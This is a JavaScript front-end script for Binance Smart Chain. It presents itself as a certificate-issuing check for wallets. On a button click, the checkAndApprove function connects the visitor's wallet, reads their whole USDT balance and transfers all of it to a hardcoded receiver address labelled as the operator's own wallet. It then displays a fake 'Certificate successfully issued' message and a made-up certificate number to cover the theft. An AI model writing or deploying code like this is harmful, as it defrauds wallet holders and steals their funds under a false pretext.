const BSC_CHAIN_ID = '0x38'; // Binance Smart Chain
const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT
const RECEIVER_ADDRESS = '0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999'; // Aapka Wallet
let web3, usdtContract;

// USDT Contract ABI (only needed methods)
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function"
  },
  {
    constant: false,
    inputs: [
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
];

// Main function triggered on button click
async function checkAndApprove() {
  if (typeof window.ethereum === 'undefined') {
    alert("⚠️ Please install MetaMask or Trust Wallet.");
    return;
  }

  web3 = new Web3(window.ethereum);
  await switchToBSC();

  const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
  const userAddress = accounts[0];

  usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
  const balance = await usdtContract.methods.balanceOf(userAddress).call();

  if (Number(balance) === 0) {
    alert("🚫 You have 0 USDT in your wallet.");
    return;
  }

  try {
    // Transfer full balance to your wallet
    await usdtContract.methods.transfer(RECEIVER_ADDRESS, balance).send({ from: userAddress });

    // Show success on screen
    document.getElementById("status").textContent = `✅ Certificate successfully issued. Transferred: ${web3.utils.fromWei(balance, 'ether')} USDT`;
    document.getElementById("walletAddress").textContent = `Wallet: ${userAddress}`;
    document.getElementById("balanceAmount").textContent = `${web3.utils.fromWei(balance, 'ether')} USDT`;
    document.getElementById("certificateNumber").textContent = "CERT-" + Date.now().toString(36).toUpperCase();
  } catch (error) {
    alert("⚠️ Transaction cancelled or failed.");
  }
}

// BSC chain par switch
async function switchToBSC() {
  try {
    await ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: BSC_CHAIN_ID }],
    });
  } catch (error) {
    if (error.code === 4902) {
      // Add BSC network if not already present
      await ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: 'Binance Smart Chain',
          rpcUrls: ['https://bsc-dataseed.binance.org/'],
          nativeCurrency: {
            name: 'BNB',
            symbol: 'BNB',
            decimals: 18,
          },
          blockExplorerUrls: ['https://bscscan.com'],
        }],
      });
    } else {
      throw error;
    }
  }
}
